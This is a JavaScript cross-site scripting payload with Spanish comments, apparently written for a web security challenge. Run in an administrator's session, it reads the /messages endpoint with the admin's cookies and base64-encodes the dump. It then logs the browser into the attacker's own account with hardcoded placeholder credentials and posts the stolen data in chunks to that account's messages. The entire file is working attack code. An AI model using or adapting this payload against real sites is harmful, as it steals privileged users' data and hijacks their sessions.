// navaja_dump2.js — lee /messages como ADMIN -> guarda -> pivota -> publica en tu buzón
(async () => {
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  try {
    // 1) Leer mensajes (admin)
    const r = await fetch('/messages', { credentials: 'include' });
    const j = await r.json();
    const dumpB64 = btoa(unescape(encodeURIComponent(JSON.stringify(j))));

    // 2) Pivot a TU usuario
    const YOUR_USER = 'insider1'; // <-- cambia
    const YOUR_PASS = 'insideer';   // <-- cambia
    await fetch('/auth', {
      method: 'POST',
      headers: {'Content-Type':'application/x-www-form-urlencoded'},
      body: 'action=login&username='+encodeURIComponent(YOUR_USER)+'&password='+encodeURIComponent(YOUR_PASS)
    });
    await (sleep(300));

    // 3) Publicar en trozos
    const CH = 900;
    for (let i=0,p=0;i<dumpB64.length && p<6;i+=CH,p++){
      await fetch('/create_msg', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ message: `ADM_B64_${p}: ` + dumpB64.slice(i,i+CH) })
      });
      await sleep(60);
    }
  } catch (e) {
    try {
      await fetch('/create_msg', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ message: `ADM_ERR: ${String(e)}` })
      });
    } catch(_) {}
  }
})();
